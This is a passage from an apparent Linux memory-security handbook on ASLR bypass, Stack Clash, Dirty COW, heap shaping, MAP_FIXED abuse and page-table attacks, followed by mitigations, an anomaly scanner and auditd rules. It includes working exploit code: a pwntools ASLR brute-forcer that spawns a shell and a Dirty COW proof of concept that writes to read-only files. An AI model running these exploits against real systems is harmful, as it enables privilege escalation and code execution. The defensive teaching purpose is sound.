**Physmap spray**: an attacker who can spray the kernel heap (via `msgsnd`, `add_key`, `sendmsg` ancillary data, etc.) is placing controlled data in the direct map. If the attacker can find or predict the physical address of their data (via information leaks or timing), they can reference it.

**`/proc/PID/pagemap`**: exposes the VA-to-PFN (physical frame number) mapping. Since Linux 4.0, reading PFNs requires `CAP_SYS_ADMIN`, closing the direct-map targeting vector for unprivileged users.

**`CONFIG_STRICT_DEVMEM`**: restricts `/dev/mem` to I/O regions only, preventing userspace from reading or writing arbitrary physical RAM through the legacy device. Combined with `CONFIG_IO_STRICT_DEVMEM` (restricts even I/O regions to those not claimed by a kernel driver), this closes the `/dev/mem`-as-rootkit-vector path.

**`/dev/kmem`**: provides direct access to kernel virtual memory. Almost universally disabled (`CONFIG_DEVKMEM=n`) on modern kernels. Historically used for rootkit installation.

---

## 13. ASLR bypass techniques

ASLR is probabilistic, not deterministic. It raises the bar for blind exploitation but does not eliminate address-space predictability when the attacker can obtain a single information leak, exploit a fork-without-exec service model, or constrain the guess space through partial overwrites. This section catalogues the primary bypass classes with working code.

### 13.1 Information leak via format string

A classic information-disclosure primitive. If the attacker controls a format string argument passed to `printf`-family functions, `%p` directives dump stack values — which include saved return addresses, frame pointers, and pointers into libc, the heap, and the stack itself. A single leaked libc pointer reveals the libc base (subtract the known offset of the leaked symbol), defeating ASLR for that region.

```c
/* format_string_leak.c — demonstrates %p info leak
 * Compile: gcc -o fmt_leak format_string_leak.c -no-pie
 * Run: echo '%p.%p.%p.%p.%p.%p.%p.%p' | ./fmt_leak
 */
#include <stdio.h>
#include <string.h>

void vulnerable(const char *input) {
    char buf[256];
    strncpy(buf, input, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    /* BUG: user input used as format string */
    printf(buf);
    printf("\n");
}

int main(void) {
    char input[256];
    if (fgets(input, sizeof(input), stdin) != NULL) {
        input[strcspn(input, "\n")] = '\0';
        vulnerable(input);
    }
    return 0;
}
```

On x86_64 the first six integer arguments are in registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`); additional `%p` directives walk the stack. The 7th `%p` typically reaches saved `rbp` or return addresses. Offsets `%7$p`, `%8$p`, etc. can be used for direct parameter access. In a typical glibc-linked binary, the return address of `main` (pointing into `__libc_start_main + offset`) immediately gives the attacker `libc_base = leaked_addr - known_offset`. From the libc base, the attacker computes `system()`, `/bin/sh`, one-gadget RCE addresses, or a full ROP chain.

Defence: compiler warnings (`-Wformat-security`), static analysis, and never passing user-controlled strings as format arguments. Detection: format strings containing multiple `%` specifiers in logged input, or anomalous `printf` output length relative to expected response. Seccomp can restrict `write` output length (covered in Chapter 2B §3), but the primary fix is input validation.

### 13.2 `/proc/self/maps` reading

For local privilege escalation or container-escape scenarios, the attacker process can simply read its own address-space layout:

```c
/* read_maps.c — read own ASLR layout */
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) { perror("fopen"); return 1; }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        printf("%s", line);
    }
    fclose(fp);
    return 0;
}
```

This yields the exact base addresses of every loaded library, the stack, the heap, the vDSO, and the executable itself. For reading another process's maps, `/proc/PID/maps` requires `ptrace` attach permission (controlled by `kernel.yama.ptrace_scope`, see Chapter 2B §7). In containerised environments, `/proc/PID/maps` of processes in the same PID namespace is often readable, making info leaks trivial for an attacker with code execution in the same container.

Hardening: `kernel.yama.ptrace_scope = 3` (no ptrace at all) prevents cross-process maps reading. The `hidepid=2` or `hidepid=invisible` mount option on `/proc` hides other processes' entries. Within the same process, `/proc/self/maps` is always readable — the protection must come from preventing the attacker from achieving code execution in the first place, or from constraining their ability to exfiltrate the data (seccomp on `open`/`openat` for `/proc` paths).

### 13.3 Brute-force in fork-no-exec servers

When a service forks to handle connections but does not `execve` (the classic Apache prefork model, PHP-FPM, some custom TCP servers), all child processes share the parent's ASLR layout. The attacker can crash children repeatedly: each crash probes one candidate address, and the service spawns a replacement with the same layout. With 28 bits of mmap entropy and a 4096-byte page size, the number of candidate page-aligned addresses is 2^28 = ~268 million, but partial overwrites (§13.4) reduce this dramatically.

A practical brute-force against a 64-bit fork-no-exec service with a stack buffer overflow and a known canary (or no canary):

```python
#!/usr/bin/env python3
"""aslr_brute.py — brute-force ASLR in fork-no-exec service.
Requires: pip install pwntools
Target: a vulnerable fork-no-exec TCP server on localhost:4444
"""
from pwn import remote, log, p64
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 4444
OFFSET_TO_RET = 72           # buffer size + saved rbp
KNOWN_LIBC_GADGET_OFF = 0x4f3d5  # one_gadget offset in target libc

# Start from a likely mmap base and iterate upward
# On x86_64, libc typically maps in 0x7f0000000000 - 0x7fffffffffff
BASE_START = 0x7f0000000000
BASE_END   = 0x7fffffffffff
PAGE_SIZE  = 0x1000
STEP       = 0x200000        # 2 MB alignment (common for libc .text)

attempt = 0
for candidate_base in range(BASE_START, BASE_END, STEP):
    attempt += 1
    target_addr = candidate_base + KNOWN_LIBC_GADGET_OFF
    payload = b"A" * OFFSET_TO_RET + p64(target_addr)
    try:
        io = remote(TARGET_HOST, TARGET_PORT, timeout=2)
        io.send(payload)
        # If we get a shell prompt back, we won
        resp = io.recv(timeout=1)
        if b"$" in resp or b"#" in resp or b"uid=" in resp:
            log.success(f"Hit after {attempt} attempts: base=0x{candidate_base:x}")
            io.interactive()
            sys.exit(0)
        io.close()
    except Exception:
        pass
    if attempt % 1000 == 0:
        log.info(f"Attempt {attempt}, trying base 0x{candidate_base:x}")

log.failure("Exhausted search space")
```

In practice the search space is far smaller than 2^28 because libc is 2 MB-aligned and the mmap region typically falls within a ~1 TB band, giving roughly 2^19 candidates at 2 MB stride. At 100 attempts/second against a fast-forking service, exhaustion takes roughly 90 minutes — entirely practical for a targeted attack.

**CVE-2017-1000370 and CVE-2017-1000371 (Stack Clash + offset2lib).** On i386 Linux, the `offset2lib` technique exploited the fact that PIE executables and their loaded libraries shared a single ASLR random offset — leaking any library address immediately revealed the executable's base. CVE-2017-1000370 (stack clash on i386 with PIE) and CVE-2017-1000371 (stack clash on i386 with `ld.so`) demonstrated that large environment or argument strings could push the stack into the mmap region, colliding with the heap or libraries. Combined with offset2lib, a single controlled stack-to-library collision defeated both ASLR and stack isolation. The kernel fix separated executable and library randomization and enforced the stack gap (see §4, `stack_guard_gap`).

### 13.4 Partial overwrite

If the attacker can overwrite only the low 2 bytes of a return address or function pointer, they need only guess 12 bits of entropy (the low 12 bits are the page offset, which is deterministic; the next 4 bits in the overwritten byte are the guess target). 2^12 = 4096 candidates, often brute-forcible in seconds against a fork-no-exec server.

The technique exploits the fact that on little-endian architectures, a stack buffer overflow overwrites the low bytes of the saved return address first. If the attacker controls exactly 2 bytes of overwrite (via a precise off-by-N or a short overflow), they can redirect execution to a gadget within the same 64 KB page-group as the original return target. Since the original return target is typically in libc, the attacker picks a useful gadget (a one-gadget RCE, a `system()` call) that falls within the same 64 KB range, writes the 2-byte offset, and hopes the 4 unknown bits match. 16 attempts on average, with fork-no-exec making it reliable.

### 13.5 ASLR bypass via side channels

Beyond direct leaks, the attacker can infer address layout through timing side channels: cache-timing differences between accessed and unaccessed pages (probing whether a speculative load hit the TLB), page-fault timing (measurable via `userfaultfd` or signal handling — covered in Chapter 2B), and the `mincore` side channel (historical, partially mitigated since Linux 5.0 as described in §8.3). The Branch Target Buffer (BTB) and Branch History Buffer (BHB) can leak virtual addresses across privilege boundaries on CPUs vulnerable to Spectre-v2 variants (see Domain 7).

---

## 14. Stack Clash exploitation

### 14.1 The vulnerability (CVE-2017-1000364)

The stack clash vulnerability class exploits the gap (or lack thereof) between the stack and adjacent memory regions. Before the kernel stack gap fix, the only protection between the growing stack and the mmap region (or heap) was a single guard page — 4 KB. A large `alloca()` or VLA (variable-length array) allocation that exceeds the guard page size moves the stack pointer past the guard without touching it (no page fault), landing in an adjacent mapped region. Writes through the now-illegal stack pointer corrupt that region.

CVE-2017-1000364 was the Linux-specific instance. The attack requires a local code execution context (e.g., a setuid binary with a controllable large stack allocation, or a service handling attacker-controlled input sizes).

### 14.2 Exploitation mechanism

The core technique is a "stack pivot past the guard page." The attacker needs:

1. A code path that performs a stack allocation larger than the guard page (4 KB pre-fix, 1 MB post-fix with `stack_guard_gap`).
2. The allocated stack region to overlap with a useful target (the heap, a `mmap`'d region, or a library's `.data` section).
3. The ability to write controlled data through the stack pointer into the overlapped region.

```c
/* stack_clash_demo.c — demonstrates guard page skip
 * WARNING: This is a demonstration of the vulnerability mechanism.
 * On unpatched kernels (pre-4.11.5), this can corrupt adjacent mappings.
 * Compile: gcc -o stack_clash stack_clash_demo.c -fno-stack-clash-protection
 */
#include <stdio.h>
#include <string.h>
#include <alloca.h>

void trigger_clash(size_t size) {
    /*
     * alloca moves RSP by 'size' bytes without touching intermediate pages.
     * If size > guard_page_size, RSP lands past the guard in the adjacent
     * mapping. The subsequent memset writes into that mapping.
     */
    volatile char *p = alloca(size);
    /* This write goes to the adjacent mapping, not the stack */
    memset((void *)p, 0x41, 4096);
    printf("alloca returned: %p\n", (void *)p);
}

int main(int argc, char **argv) {
    size_t clash_size = 0x200000; /* 2 MB — well past 4 KB guard */
    if (argc > 1) {
        clash_size = strtoul(argv[1], NULL, 0);
    }
    printf("Attempting stack clash with size 0x%zx\n", clash_size);
    trigger_clash(clash_size);
    return 0;
}
```

In a real exploit, the attacker targets a setuid binary or a privileged daemon. Qualys demonstrated practical Stack Clash exploitation against Exim (`CVE-2017-1000369`, Exim specific), sudo, ld.so, and others. The general chain: (1) spray the heap/mmap region to place a controlled data structure adjacent to the stack, (2) trigger a large stack allocation that skips the guard, (3) the stack write corrupts the sprayed data structure (e.g., overwriting a function pointer or return address stored in the heap), (4) control flow hijack.

### 14.3 Mitigation verification

```bash
# Check kernel stack gap (should be >= 256 pages = 1 MB)
cat /proc/sys/vm/stack_guard_gap
# Expected: 256 (or larger)

# Check compiler stack clash protection
gcc -v -x c -E /dev/null 2>&1 | grep -i stack-clash
# GCC 8+ enables -fstack-clash-protection by default on many targets

# Verify a binary was compiled with stack clash protection
objdump -d /usr/bin/sudo | grep -c 'or.*%fs:0x28'
# Stack probing instructions appear as periodic writes during
# large stack frame setup — look for sequences of:
#   sub $0x1000,%rsp; or $0x0,(%rsp)  (probe each page)

# Check kernel config
grep CONFIG_VMAP_STACK /boot/config-$(uname -r)
# CONFIG_VMAP_STACK=y — uses vmalloc for kernel thread stacks,
# providing guard pages for kernel stacks too
```

The compiler mitigation (`-fstack-clash-protection`) emits a probe (a write to each 4 KB page) for any stack frame larger than a page. This ensures every guard page in the path is touched, converting the silent skip into a `SIGSEGV`. The kernel mitigation (`stack_guard_gap`, default 256 pages = 1 MB) ensures there is a 1 MB gap between the stack VMA and any adjacent VMA, meaning the attacker needs a 1 MB+ allocation to skip the gap.

---

## 15. Dirty COW (CVE-2016-5195)

### 15.1 The race condition

Dirty COW is a privilege escalation vulnerability in the kernel's copy-on-write page fault handler (described in §9) that existed for approximately nine years (introduced in kernel 2.6.22, fixed in 4.8.3/4.7.9). It exploits a race between two operations on a `MAP_PRIVATE` file-backed mapping:

1. **`write()` via `/proc/self/mem`**: the process writes to its own memory through the `/proc/self/mem` interface, which calls `get_user_pages()` with `FOLL_WRITE`. The COW handler breaks the COW — allocates a private copy of the page, installs it in the process's page tables, and returns a reference to the private page.

2. **`madvise(MADV_DONTNEED)`**: a racing thread calls `madvise(MADV_DONTNEED)` on the same address range. This discards the private COW copy and resets the PTE to point back to the original shared (file-backed) page.

The race window: after the COW handler installs the private page but before `get_user_pages()` completes the write, `madvise(MADV_DONTNEED)` discards the private page. The kernel retries the `get_user_pages()` sequence, but on the second pass, the `FOLL_COW` flag (indicating a COW was already performed) causes the kernel to skip the COW and write directly to the now-shared file-backed page. The process has written to a read-only file.

### 15.2 Compact PoC

```c
/* dirtycow_demo.c — CVE-2016-5195 race condition demonstration
 * This writes to a file the process has only read access to.
 * TARGET KERNEL: Linux < 4.8.3 (unpatched).
 * On patched kernels this has no effect.
 *
 * Compile: gcc -o dirtycow dirtycow_demo.c -lpthread
 * Usage:   ./dirtycow /etc/target_file offset "replacement_text"
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>

struct thread_args {
    void   *map;
    size_t  map_size;
    off_t   offset;
    char   *payload;
    size_t  payload_len;
    int     stop;
};

void *madvise_thread(void *arg) {
    struct thread_args *ta = arg;
    while (!ta->stop) {
        madvise(ta->map, ta->map_size, MADV_DONTNEED);
        usleep(1);
    }
    return NULL;
}

void *write_thread(void *arg) {
    struct thread_args *ta = arg;
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/mem");
    int fd = open(path, O_RDWR);
    if (fd < 0) { perror("open /proc/self/mem"); return NULL; }

    for (int i = 0; i < 100000 && !ta->stop; i++) {
        lseek(fd, (off_t)ta->map + ta->offset, SEEK_SET);
        write(fd, ta->payload, ta->payload_len);
        usleep(1);
    }
    close(fd);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <file> <offset> <text>\n", argv[0]);
        return 1;
    }
    const char *target = argv[1];
    off_t offset = strtol(argv[2], NULL, 0);
    char *payload = argv[3];

    int fd = open(target, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);

    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }
    close(fd);

    struct thread_args ta = {
        .map = map, .map_size = st.st_size,
        .offset = offset, .payload = payload,
        .payload_len = strlen(payload), .stop = 0
    };

    pthread_t t1, t2;
    pthread_create(&t1, NULL, madvise_thread, &ta);
    pthread_create(&t2, NULL, write_thread, &ta);

    /* Run for a bounded time */
    sleep(5);
    ta.stop = 1;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    munmap(map, st.st_size);
    printf("Race completed. Check %s at offset %ld.\n", target, offset);
    return 0;
}
```

### 15.3 THP amplification

As noted in §11.2, Transparent Huge Pages amplify Dirty COW's impact. When `khugepaged` has collapsed the target file's pages into 2 MB huge pages, the COW break-and-race operates on a 2 MB granule. A successful race corrupts the entire 2 MB huge page rather than a single 4 KB page. This means the attacker can modify up to 2 MB of a read-only file in a single race window. The practical consequence: instead of surgically replacing a few bytes (e.g., a password hash in `/etc/shadow`), the attacker can rewrite large portions of a shared library's `.text` section.

### 15.4 Detection and forensics

**Integrity monitoring.** File integrity monitoring (AIDE, OSSEC, Tripwire, or dm-verity for immutable rootfs) detects the result of Dirty COW: a file on disk whose checksum no longer matches the recorded baseline, despite no legitimate `open(O_WRONLY)` or `write()` syscall in the audit log. The absence of a write-open audit event combined with a changed file hash is a strong indicator of a COW race exploitation.

**Memory forensics.** On a live system, compare the file on disk with the page-cache contents (via `/proc/PID/maps` + `/proc/PID/mem` or a kernel module reading the page cache). If they differ for a MAP_PRIVATE mapping that should be clean (no legitimate COW), the discrepancy indicates exploitation.

**Kernel log indicators.** Patched kernels (4.8.3+) added the `FOLL_COW` / `FOLL_FORCE` check that prevents the race. On older kernels, there is no kernel-log artifact from the race itself — it is a silent corruption. The primary detection vector is after-the-fact integrity checking.

**auditd rule.** While the race itself is silent, an attacker using Dirty COW often first maps the target file and accesses `/proc/self/mem`:

```
-w /proc/self/mem -p rw -k proc_self_mem_access
-a always,exit -F arch=b64 -S madvise -F a2=4 -k madvise_dontneed
```

The second rule flags `madvise` calls with `MADV_DONTNEED` (argument value 4). High-frequency `MADV_DONTNEED` calls on file-backed mappings from a non-allocator context are anomalous.

---

## 16. Heap shaping via address-space manipulation

### 16.1 mmap/munmap for heap layout control

Exploitation of heap vulnerabilities often requires placing specific objects at predictable offsets. The attacker uses `mmap` and `munmap` to shape the virtual address space, creating holes of known size that the kernel's allocator will reuse:

```c
/* heap_shape.c — create and fill address-space holes
 * This technique shapes the mmap region so that subsequent mmap
 * allocations land at predictable relative offsets.
 */
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

#define HOLE_SIZE (0x1000)  /* 4 KB */
#define NUM_SLOTS 64

int main(void) {
    void *slots[NUM_SLOTS];

    /* Phase 1: Allocate a contiguous block of slots */
    for (int i = 0; i < NUM_SLOTS; i++) {
        slots[i] = mmap(NULL, HOLE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (slots[i] == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
    }

    /* Phase 2: Free alternating slots to create a predictable
     * pattern of free holes in the VMA space */
    for (int i = 0; i < NUM_SLOTS; i += 2) {
        munmap(slots[i], HOLE_SIZE);
        slots[i] = NULL;
    }

    /* Phase 3: Trigger the vulnerable allocation.
     * The kernel's top-down mmap search will fill the most recently
     * freed holes first (LIFO behavior in the gap search). */
    void *victim = mmap(NULL, HOLE_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("Victim allocation at: %p\n", victim);

    /* The victim is now adjacent to a controlled slot.
     * An overflow from/into the controlled slot reaches the victim. */
    for (int i = 1; i < NUM_SLOTS; i += 2) {
        if (slots[i]) {
            ptrdiff_t delta = (char *)victim - (char *)slots[i];
            printf("  slot[%d]=%p, delta=%td bytes\n", i, slots[i], delta);
        }
    }

    return 0;
}
```

### 16.2 MADV_DONTNEED for controlled page recycling

`madvise(MADV_DONTNEED)` on anonymous private mappings zeroes the pages without unmapping the VMA. This is cheaper than `munmap` + `mmap` and preserves the virtual address. Attackers use this to:

1. **Reset heap contents** to a known state (all zeros) without changing the layout.
2. **Race page faults** — after `MADV_DONTNEED`, the next access triggers a fresh page fault. If combined with `userfaultfd` (Chapter 2B §6), the attacker can pause the fault resolution and interleave another operation, creating race windows.
3. **Defeat heap randomisation** — by freeing and re-faulting pages in a controlled sequence, the attacker ensures that the page allocator returns pages in a predictable order (the buddy allocator's LIFO behaviour for recently freed pages).

### 16.3 Kernel heap spray via userspace

For kernel exploitation, the attacker sprays the kernel heap (SLUB allocator) from userspace by invoking system calls that allocate kernel objects of a controlled size. The canonical spray primitives — `msgsnd()` (allocates `msg_msg` + payload in kmalloc caches), `add_key()` (allocates `user_key_payload`), `sendmsg()` with `MSG_MORE` (allocates `sk_buff` data) — are covered in Domain 5 Chapter 5A. The address-space manipulation described here (§16.1, §16.2) is the userspace-side complement: shaping the attacker's own address space to facilitate reading back kernel data (via sprayed structures that contain user-controlled pointers read back through `msgrcv()` or `keyctl_read()`).

---

## 17. MAP_FIXED abuse

### 17.1 Overwriting loaded libraries

`MAP_FIXED` silently replaces any existing mapping at the target address. An attacker with local code execution (e.g., via a limited RCE in a web application running as an unprivileged user) can use `MAP_FIXED` to overwrite the `.text` section of a loaded shared library in their own process:

```c
/* mapfixed_hijack.c — replace libc's .text with controlled code
 * This runs within the attacker's own process (same privilege level).
 * The technique is relevant when the attacker has code execution in
 * a sandboxed or restricted process and wants to modify the behavior
 * of library functions called by the same process.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <stdint.h>

int main(void) {
    /* Find libc's base address */
    void *libc_fn = dlsym(NULL, "printf");
    if (!libc_fn) { fprintf(stderr, "dlsym failed\n"); return 1; }

    /* Page-align to get the start of the page containing printf */
    uintptr_t page_addr = (uintptr_t)libc_fn & ~0xFFFUL;

    /* Overwrite that page with MAP_FIXED */
    void *p = mmap((void *)page_addr, 4096,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                   -1, 0);
    if (p == MAP_FAILED) {
        perror("mmap MAP_FIXED");
        return 1;
    }

    /* Write controlled instructions (e.g., a ret sled or shellcode) */
    memset(p, 0xC3, 4096);  /* fill with RET instructions */
    printf("Page at %p replaced — printf is now a RET sled\n", p);
    /* Any subsequent call to printf (within this page) returns immediately */

    return 0;
}
```

This technique is primarily useful when the attacker is inside a process that will later gain privileges (e.g., a setuid binary that has already loaded libraries before dropping privileges) or when a seccomp filter blocks `execve` but allows `mmap` — the attacker cannot spawn a new process but can reshape the current one.

### 17.2 Detection via `/proc/PID/maps` anomalies

`MAP_FIXED` replacement of a library leaves a visible anomaly in `/proc/PID/maps`:

```
# Normal libc mapping:
7f1234560000-7f12346a0000 r-xp 00000000 08:01 131073  /usr/lib/x86_64-linux-gnu/libc.so.6

# After MAP_FIXED replacement of one page:
7f1234560000-7f1234561000 rwxp 00000000 00:00 0
7f1234561000-7f12346a0000 r-xp 00001000 08:01 131073  /usr/lib/x86_64-linux-gnu/libc.so.6
```

The anomaly: an anonymous (`00:00 0`, no inode) mapping with `rwx` permissions in the middle of a file-backed library mapping. The Python detection script in §19.1 flags this pattern. Additionally, the file-backed VMA's offset jumps (from `00000000` to `00001000`), indicating a gap where the original mapping was replaced.

`MAP_FIXED_NOREPLACE` (Linux 4.17+, flag value `MAP_FIXED | 0x100000`) prevents this: it fails with `EEXIST` if the range is already mapped. However, the attacker controls the `mmap` call and will not voluntarily use `MAP_FIXED_NOREPLACE`. Detection must be external.

---

## 18. Page table manipulation attacks

### 18.1 Ret2dir: bypassing SMEP and SMAP via the physmap

Ret2dir (Kemerlis et al., USENIX Security 2014) exploits the kernel's direct physical memory map (§12). If the attacker has a kernel-mode write primitive (e.g., from a use-after-free or out-of-bounds write in a kernel object), they can overwrite a function pointer to redirect kernel execution. SMEP (Supervisor Mode Execution Prevention) prevents the kernel from executing user-space pages, and SMAP (Supervisor Mode Access Prevention) prevents the kernel from reading/writing user-space pages, blocking the classic ret2usr attack.

Ret2dir bypasses both: the attacker allocates user-controlled data via `mmap(MAP_ANONYMOUS)`, fills it with shellcode, then determines the physical address of that page (historically via `/proc/PID/pagemap`, now requiring `CAP_SYS_ADMIN`). The corresponding kernel virtual address in the direct map is `physical_address + PAGE_OFFSET`. Because the direct map is kernel memory (not user memory), SMEP and SMAP do not apply. The attacker overwrites the function pointer with the physmap address of their shellcode.

The attack chain:

1. Allocate user pages with shellcode: `char *buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0); memcpy(buf, shellcode, sizeof(shellcode));`
2. Determine the physical frame number: read `/proc/self/pagemap` at the offset corresponding to `buf`'s virtual page (requires `CAP_SYS_ADMIN` since Linux 4.0).
3. Compute physmap address: `kernel_addr = pfn * PAGE_SIZE + PAGE_OFFSET`.
4. Use the kernel write primitive to overwrite a function pointer with `kernel_addr`.
5. Trigger the function pointer call — kernel executes the attacker's shellcode from the physmap.

**Mitigations.** Restricting `/proc/PID/pagemap` PFN reads to `CAP_SYS_ADMIN` (Linux 4.0) blocks step 2 for unprivileged attackers. KASLR randomizes `PAGE_OFFSET`, adding entropy to the physmap base. `CONFIG_STRICT_DEVMEM` prevents `/dev/mem` based PFN discovery. The `XPFO` (eXclusive Page Frame Ownership) patch set (never merged mainline as of kernel 6.8, but available as out-of-tree patches) unmaps user pages from the physmap after allocation, making them inaccessible via the direct map. Alternatively, `CONFIG_INIT_ON_FREE_DEFAULT_ON` zeroes freed pages, limiting the window for physmap reads.

### 18.2 PTE overwrite for arbitrary code execution

If the attacker has a kernel write-what-where primitive with sufficient precision to target a PTE, they can modify page table entries directly:

**Scenario.** The attacker knows (or can calculate) the kernel virtual address of the PTE for a user-space page in their own process. This is possible if the attacker has leaked the PGD physical address (from `CR3` via an info leak) and can walk the page table structure in the physmap.

**Attack.** The attacker overwrites the target PTE to:

1. **Change permissions**: clear `_PAGE_NX` on a data page, making it executable. Write shellcode to the page (which was already writable), then jump to it. This bypasses W^X without needing `mprotect`.
2. **Remap the page**: change the PFN (bits 12–51) to point to a different physical page — for example, a page belonging to another process or the kernel. The attacker can then read/write that foreign page through their own virtual address.
3. **Escalate to kernel**: remap a user page to point to a kernel page table page (the PGD or a PMD), then modify the kernel's own page tables from user space, gaining unrestricted read/write to all physical memory.

**Detection.** PTE modification by a kernel exploit produces no standard audit event — it operates below the syscall layer. Detection relies on kernel integrity monitoring: runtime page table scanning (integrity measurement), `CONFIG_DEBUG_WX` (which scans for writable+executable kernel mappings at boot), and eBPF tracepoints on `set_pte` / `set_pmd` kernel functions (though an attacker with a write primitive may bypass these by writing directly to physical memory). The `XPFO` and `KFENCE` mechanisms (see Chapter 2C) add probabilistic detection of out-of-bounds page table corruption.

### 18.3 Cross-references to kernel exploitation

The page table manipulation techniques described here are the *outcome* of a kernel exploit — the attacker first needs a write primitive. The primitives themselves (SLUB overflow, use-after-free in kernel objects, msg_msg manipulation) are covered in Domain 5 Chapter 5A. The ret2dir and PTE overwrite techniques are the *payloads* that convert a write primitive into full kernel compromise.

---

## 19. Detection and memory forensics

### 19.1 Memory layout anomaly detection

The following Python script parses `/proc/PID/maps` and flags suspicious VMAs. It detects: W+X mappings, anonymous executable regions (potential shellcode), gaps in file-backed library mappings (MAP_FIXED replacement), and regions with unusual permission transitions.

```python
#!/usr/bin/env python3
"""vma_anomaly_scanner.py — detect suspicious memory mappings.
Usage: python3 vma_anomaly_scanner.py <pid>
       python3 vma_anomaly_scanner.py --all  (scan all readable /proc/PID/maps)
"""
import sys
import os
import re

KNOWN_ANON_EXEC = {"[vdso]", "[vsyscall]"}

def parse_maps(pid):
    """Parse /proc/<pid>/maps and return list of VMA dicts."""
    path = f"/proc/{pid}/maps"
    vmas = []
    try:
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 5)
                addr_range = parts[0]
                perms = parts[1]
                offset = parts[2]
                dev = parts[3]
                inode = parts[4]
                name = parts[5] if len(parts) > 5 else ""
                start, end = addr_range.split("-")
                vmas.append({
                    "start": int(start, 16),
                    "end": int(end, 16),
                    "perms": perms,
                    "offset": offset,
                    "dev": dev,
                    "inode": inode,
                    "name": name.strip(),
                    "raw": line,
                })
    except PermissionError:
        return None
    return vmas

def scan_vmas(pid, vmas):
    """Flag anomalous VMAs."""
    findings = []

    for i, vma in enumerate(vmas):
        perms = vma["perms"]
        name = vma["name"]
        size = vma["end"] - vma["start"]

        # 1. W+X mapping (writable and executable)
        if "w" in perms and "x" in perms:
            findings.append({
                "severity": "HIGH",
                "type": "WX_MAPPING",
                "detail": f"W+X mapping: {vma['raw']}",
            })

        # 2. Anonymous executable region (not vDSO/vsyscall)
        if ("x" in perms and vma["inode"] == "0"
                and name not in KNOWN_ANON_EXEC and not name):
            findings.append({
                "severity": "HIGH",
                "type": "ANON_EXEC",
                "detail": f"Anonymous executable region: {vma['raw']}",
            })

        # 3. Gap in file-backed mapping (MAP_FIXED replacement indicator)
        if i > 0 and vma["name"] and vma["name"] == vmas[i-1].get("name"):
            prev = vmas[i-1]
            if prev["end"] != vma["start"]:
                gap_size = vma["start"] - prev["end"]
                if gap_size > 0:
                    findings.append({
                        "severity": "MEDIUM",
                        "type": "LIBRARY_GAP",
                        "detail": (f"Gap in library mapping ({gap_size:#x} bytes)"
                                   f" in {name}: prev_end={prev['end']:#x},"
                                   f" this_start={vma['start']:#x}"),
                    })

        # 4. Large anonymous RWX region (shellcode staging)
        if ("r" in perms and "w" in perms and "x" in perms
                and vma["inode"] == "0" and size > 0x10000):
            findings.append({
                "severity": "CRITICAL",
                "type": "LARGE_RWX_ANON",
                "detail": f"Large anonymous RWX ({size:#x} bytes): {vma['raw']}",
            })

    return findings

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pid|--all>", file=sys.stderr)
        sys.exit(1)

    targets = []
    if sys.argv[1] == "--all":
        for entry in os.listdir("/proc"):
            if entry.isdigit():
                targets.append(entry)
    else:
        targets.append(sys.argv[1])

    for pid in targets:
        vmas = parse_maps(pid)
        if vmas is None:
            continue
        findings = scan_vmas(pid, vmas)
        if findings:
            try:
                comm = open(f"/proc/{pid}/comm").read().strip()
            except (FileNotFoundError, PermissionError):
                comm = "?"
            print(f"=== PID {pid} ({comm}) ===")
            for f in findings:
                print(f"  [{f['severity']}] {f['type']}: {f['detail']}")

if __name__ == "__main__":
    main()
```

### 19.2 ASLR verification commands

```bash
# 1. Check ASLR mode (0=off, 1=stack/mmap/vdso, 2=full including brk)
cat /proc/sys/kernel/randomize_va_space
# Expected: 2

# 2. Check mmap randomization bits
cat /proc/sys/vm/mmap_rnd_bits
# Expected: 28-32 (x86_64), 18-33 (AArch64 depending on VA size)

# 3. Check mmap_rnd_compat_bits (for 32-bit processes)
cat /proc/sys/vm/mmap_rnd_compat_bits
# Expected: 8-16

# 4. Verify PIE compilation on a binary
file /usr/bin/ssh
# Should show "ELF 64-bit LSB pie executable" (not "executable")

# 5. checksec output (from pwntools or checksec.sh)
checksec --file=/usr/bin/sudo
# Look for:
#   RELRO:    Full RELRO
#   Stack:    Canary found
#   NX:       NX enabled
#   PIE:      PIE enabled
#   FORTIFY:  Enabled

# 6. Verify that two consecutive runs of a PIE binary map at different addresses
for i in 1 2 3; do
    cat /proc/self/maps | head -1
done
# Each invocation should show a different base address
```

### 19.3 Detection rules

#### auditd rules for memory manipulation

```bash
# Detect mprotect calls adding PROT_EXEC to anonymous mappings
# (potential shellcode activation)
-a always,exit -F arch=b64 -S mprotect -F a2&=0x4 -k mprotect_exec

# Detect mmap calls with W+X permissions (PROT_WRITE|PROT_EXEC = 0x6)
-a always,exit -F arch=b64 -S mmap -F a2&=0x6 -k mmap_wx

# Detect access to /proc/self/maps (potential ASLR info leak)
-a always,exit -F arch=b64 -S openat -F path=/proc/self/maps -k proc_maps_read

